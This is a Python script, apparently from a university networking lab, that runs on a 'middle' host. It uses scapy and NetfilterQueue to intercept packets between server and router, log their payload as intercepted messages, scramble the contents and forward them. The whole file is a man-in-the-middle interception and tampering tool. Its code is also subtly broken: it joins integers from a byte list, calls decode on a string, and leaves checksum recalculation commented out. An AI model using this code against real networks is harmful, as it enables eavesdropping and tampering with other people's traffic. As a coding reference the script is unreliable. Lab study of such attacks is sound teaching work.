import logging
import random

from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, srp, conf
from netfilterqueue import NetfilterQueue as NFQ
import os
logging.basicConfig(format = u'[LINE:%(lineno)d]# %(levelname)-8s [%(asctime)s]  %(message)s', level = logging.NOTSET)

ipServer = "198.7.0.2"
ipRouter = "198.7.0.1"
ipMiddle = "198.7.0.3"

#https://networks.hypha.ro/capitolul6/#scapy_nfqueue

def proceseaza(pachet):
    try:
        logging.info("Pachet primit")
        informatie = pachet.get_payload()
        pachet_scapy = IP(informatie)
        logging.info("Pachetul a fost incarcat in scapy")
        print(pachet_scapy.show())
        if pachet_scapy.haslayer(Raw):
            # citim mesajul
            mesaj_original = pachet_scapy[Raw].load
            logging.info("MESAJ INTERCEPTAT:" + mesaj_original.decode('utf-8'))
            caractere = list(mesaj_original)
            random.shuffle(caractere)
            mesaj_modificat = ''.join(caractere)
            logging.info("MESAJ MODIFICAT:" + mesaj_modificat.decode('utf-8'))
            pachet_scapy[Raw].load = mesaj_modificat
        # stergem checksum urile pt a fi recalculate de scapy
        # if pachet_scapy.haslayer(TCP):
        #     del pachet_scapy[TCP].chksum
        # if pachet_scapy.haslayer(UDP):
        #     del pachet_scapy[UDP].chksum
        # del pachet_scapy[IP].chksum
        logging.info("PACHET MODIFICAT")
        # generam payload din pachetul scapy
        pachet_modificat = bytes(pachet_scapy)
        logging.info("PACHET INCARCAT")
        pachet.set_payload(pachet_modificat)
        logging.info("PACHET TRIMIS")
        pachet.accept()
        logging.info("PACHET ACCEPTAT")
    except Exception as e:
        logging.error(e)
        pachet.accept()
        raise KeyboardInterrupt

queue = NFQ()
logging.info("Middle a pornit impreuna cu stiva NFQ")
try:
    print("!")
    queue.bind(5, proceseaza)
    print("@")
    queue.run()
    print("#")
except KeyboardInterrupt:
    queue.unbind()
    print("KEYBOARD INTERRUPT")
    exit(0)